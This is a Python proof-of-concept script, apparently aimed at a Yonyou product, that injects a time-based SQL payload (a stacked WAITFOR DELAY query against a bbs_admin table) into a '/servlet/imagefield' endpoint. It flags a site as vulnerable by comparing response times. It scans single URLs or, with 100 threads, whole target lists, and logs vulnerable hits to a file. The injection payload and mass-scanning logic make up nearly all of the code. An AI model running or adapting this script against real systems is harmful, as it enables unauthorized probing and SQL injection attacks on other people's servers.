import requests
import argparse
import sys
from multiprocessing.dummy import Pool
from concurrent.futures import ThreadPoolExecutor
import logging
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                                                    
 ___.__. ____   ____    ____ ___.__. ____  __ __ 
<   |  |/  _ \ /    \  / ___<   |  |/  _ \|  |  \
 \___  (  <_> )   |  \/ /_/  >___  (  <_> )  |  /
 / ____|\____/|___|  /\___  // ____|\____/|____/ 
 \/                \//_____/ \/                  
                                        version:1.0.0
                                        author:gtman                                        
"""
    print(test)

def main():
    banner() # banner
    # 处理命令行参数
    parser = argparse.ArgumentParser(description="检测SQL注入漏洞")
    # 添加两个参数
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入链接')
    parser.add_argument('-f', '--file', dest='file', type=str, help='文件路径')
    # 解析参数
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as fp:
                url_list = [i.strip() for i in fp.readlines()]
            with ThreadPoolExecutor(max_workers=100) as executor:
                executor.map(poc, url_list)
        except FileNotFoundError:
            print(f"文件 {args.file} 未找到")
        except Exception as e:
            print(f"文件处理时出错: {e}")
    else:
        print(f"用法:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:10%27--'
    url = target + url_payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    
    try:
        res1 = requests.get(target, headers=headers)
        if res1.status_code == 200:
            res2 = requests.get(url=url, headers=headers,verify=False,proxies=proxies)
            time1 = res2.elapsed.total_seconds()
            time2 = res1.elapsed.total_seconds()
            if time1 - time2 >= 5:
                print(f'URL {target} 存在延时注入漏洞')
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f'URL {target} 不存在延时注入漏洞')
        else:
            print(f'网站 {target} 存在问题，请手工测试')
    except Exception as e:
        print(f"检测 {target} 时出错")

if __name__ == '__main__':
    main()
